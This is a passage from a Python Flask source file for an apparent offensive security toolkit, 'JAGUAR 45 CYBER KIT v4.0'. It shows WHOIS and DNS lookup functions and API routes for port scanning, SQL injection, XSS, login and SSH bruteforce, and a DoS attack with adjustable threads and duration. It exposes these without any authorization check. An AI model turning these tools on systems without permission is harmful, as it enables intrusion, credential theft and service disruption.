        }
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"Header analysis failed: {str(e)}")
        raise

def tool_whois_lookup(domain: str) -> Dict:
    """Perform WHOIS lookup on domain."""
    scan_id = scanner_state.generate_id("whois")
    scanner_state.register_scan(scan_id, "whois_lookup", domain)
    
    try:
        # Simple whois implementation (for demonstration)
        # In production, use python-whois library
        
        import whois
        w = whois.whois(domain)
        
        result = {
            'domain_name': w.domain_name,
            'registrar': w.registrar,
            'creation_date': str(w.creation_date) if w.creation_date else None,
            'expiration_date': str(w.expiration_date) if w.expiration_date else None,
            'updated_date': str(w.updated_date) if w.updated_date else None,
            'name_servers': w.name_servers,
            'status': w.status,
            'emails': w.emails
        }
        
        scanner_state.complete_scan(scan_id)
        
        return {
            "status": "success",
            "scan_id": scan_id,
            "domain": domain,
            "whois_data": result
        }
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"WHOIS lookup failed: {str(e)}")
        raise

def tool_dns_enumeration(domain: str) -> Dict:
    """Enumerate DNS records."""
    scan_id = scanner_state.generate_id("dnsenum")
    scanner_state.register_scan(scan_id, "dns_enumeration", domain)
    
    try:
        if not DNS_AVAILABLE:
            raise ToolExecutionError("DNS module not available")
        
        resolver = dns.resolver.Resolver()
        resolver.timeout = 3
        resolver.lifetime = 3
        
        records = {}
        
        # Common record types to check
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        for rtype in record_types:
            try:
                answers = resolver.resolve(domain, rtype)
                records[rtype] = [str(r) for r in answers]
            except:
                records[rtype] = []
        
        scanner_state.complete_scan(scan_id)
        
        return {
            "status": "success",
            "scan_id": scan_id,
            "domain": domain,
            "dns_records": records
        }
        
    except Exception as e:
        scanner_state.complete_scan(scan_id)
        if not isinstance(e, (ToolExecutionError, ValidationError)):
            raise ToolExecutionError(f"DNS enumeration failed: {str(e)}")
        raise

# ==================== API ROUTES ====================
@app.route('/')
def index():
    """Main HTML interface."""
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>JAGUAR 45 CYBER KIT v4.0</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .tool { margin: 20px 0; padding: 15px; border: 1px solid #ddd; }
            .success { color: green; }
            .error { color: red; }
        </style>
    </head>
    <body>
        <h1>JAGUAR 45 CYBER KIT v4.0</h1>
        <p>Real Penetration Testing Toolkit - All tools functional, no simulations</p>
        
        <div class="tool">
            <h3>Available Tools:</h3>
            <ul>
                <li>Port Scanner - /api/portscan (POST)</li>
                <li>Directory Bruteforce - /api/dirscan (POST)</li>
                <li>SQL Injection Test - /api/sqli (POST)</li>
                <li>XSS Scanner - /api/xss (POST)</li>
                <li>Subdomain Finder - /api/subdomain (POST)</li>
                <li>Login Bruteforce - /api/bruteforce (POST)</li>
                <li>SSH Bruteforce - /api/ssh-bruteforce (POST)</li>
                <li>DoS Attack Test - /api/dos (POST)</li>
                <li>CMS Detection - /api/cms-detect (POST)</li>
                <li>Header Analysis - /api/headers (POST)</li>
                <li>WHOIS Lookup - /api/whois (POST)</li>
                <li>DNS Enumeration - /api/dns-enum (POST)</li>
                <li>Hash Generator - /api/hash (POST)</li>
            </ul>
        </div>
        
        <div class="tool">
            <h3>API Status:</h3>
            <p>All endpoints return consistent JSON. Use POST with JSON body.</p>
            <p>Example: {"target": "example.com", "scan_type": "quick"}</p>
        </div>
    </body>
    </html>
    """
    return render_template_string(html_content)

# Port Scanner
@app.route('/api/portscan', methods=['POST'])
@validate_required_params(['target'])
def api_portscan():
    data = request.get_json()
    result = tool_port_scan(
        target=data['target'],
        scan_type=data.get('scan_type', 'quick'),
        custom_range=data.get('custom_range', '')
    )
    return jsonify(result)

# Directory Scanner
@app.route('/api/dirscan', methods=['POST'])
@validate_required_params(['target'])
def api_dirscan():
    data = request.get_json()
    result = tool_directory_scan(
        url=data['target'],
        wordlist_type=data.get('wordlist_type', 'common'),
        custom_words=data.get('custom_words', '')
    )
    return jsonify(result)

# SQL Injection
@app.route('/api/sqli', methods=['POST'])
@validate_required_params(['target'])
def api_sqli():
    data = request.get_json()
    result = tool_sql_injection(
        url=data['target'],
        method=data.get('method', 'error')
    )
    return jsonify(result)

# XSS Scanner
@app.route('/api/xss', methods=['POST'])
@validate_required_params(['target'])
def api_xss():
    data = request.get_json()
    result = tool_xss_scan(url=data['target'])
    return jsonify(result)

# Subdomain Finder
@app.route('/api/subdomain', methods=['POST'])
@validate_required_params(['domain'])
def api_subdomain():
    data = request.get_json()
    result = tool_subdomain_scan(domain=data['domain'])
    return jsonify(result)

# Login Bruteforce
@app.route('/api/bruteforce', methods=['POST'])
@validate_required_params(['target', 'username_field', 'password_field', 'usernames', 'passwords'])
def api_bruteforce():
    data = request.get_json()
    result = tool_bruteforce_login(
        target=data['target'],
        username_field=data['username_field'],
        password_field=data['password_field'],
        usernames=data['usernames'],
        passwords=data['passwords']
    )
    return jsonify(result)

# SSH Bruteforce
@app.route('/api/ssh-bruteforce', methods=['POST'])
@validate_required_params(['target', 'usernames', 'passwords'])
def api_ssh_bruteforce():
    data = request.get_json()
    result = tool_ssh_bruteforce(
        target=data['target'],
        usernames=data['usernames'],
        passwords=data['passwords']
    )
    return jsonify(result)

# DoS Attack
@app.route('/api/dos', methods=['POST'])
@validate_required_params(['target'])
def api_dos():
    data = request.get_json()
    result = tool_dos_attack(
        target=data['target'],
        attack_type=data.get('attack_type', 'http'),
        threads=data.get('threads', 50),
        duration=data.get('duration', 10)
    )
    return jsonify(result)

# CMS Detection
@app.route('/api/cms-detect', methods=['POST'])
@validate_required_params(['url'])
def api_cms_detect():
    data = request.get_json()
    result = tool_cms_detection(url=data['url'])
    return jsonify(result)

# Header Analysis
@app.route('/api/headers', methods=['POST'])
@validate_required_params(['url'])
def api_headers():
    data = request.get_json()
    result = tool_header_analysis(url=data['url'])
    return jsonify(result)

# WHOIS Lookup
@app.route('/api/whois', methods=['POST'])
@validate_required_params(['domain'])
def api_whois():
    data = request.get_json()
    result = tool_whois_lookup(domain=data['domain'])
    return jsonify(result)

# DNS Enumeration
@app.route('/api/dns-enum', methods=['POST'])
@validate_required_params(['domain'])
def api_dns_enum():
    data = request.get_json()
    result = tool_dns_enumeration(domain=data['domain'])
    return jsonify(result)

# Hash Generator
@app.route('/api/hash', methods=['POST'])
@validate_required_params(['text'])
def api_hash():
    data = request.get_json()
    result = tool_hash_generator(text=data['text'])
    return jsonify(result)

# System Status
@app.route('/api/status', methods=['GET'])
def api_status():
    uptime = time.time() - scanner_state.start_time
    hours, remainder = divmod(uptime, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return jsonify({
        "status": "operational",
        "version": "4.0",
        "name": "JAGUAR 45 CYBER KIT",
        "uptime": f"{int(hours)}h {int(minutes)}m {int(seconds)}s",
        "active_scans": len(scanner_state.active_scans),
        "total_scans": scanner_state.scan_counter,
        "vulnerabilities_found": scanner_state.vuln_counter,
        "attacks_performed": scanner_state.attack_counter,
        "memory_usage": "stable"
    })

# Health Check
@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# Stop Scan
@app.route('/api/stop-scan/<scan_id>', methods=['POST'])
def stop_scan(scan_id):
    if scan_id in scanner_state.active_scans:
        scanner_state.active_scans[scan_id]['status'] = 'stopped'
        return jsonify({"status": "success", "message": f"Scan {scan_id} stopped"})
    return jsonify({"status": "error", "message": "Scan not found"}), 404

# ==================== MAIN ENTRY POINT ====================
if __name__ == '__main__':
    print("=" * 60)
    print("JAGUAR 45 CYBER KIT v4.0")
    print("Real Penetration Testing Toolkit")
    print("Charlie Syllas & Jaguar 45 ©2026")
    print("=" * 60)
    print(f"Starting server with {MAX_WORKERS} max workers")
    print(f"Request timeout: {REQUEST_TIMEOUT}s")
    print(f"Socket timeout: {SOCKET_TIMEOUT}s")
    print("=" * 60)
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
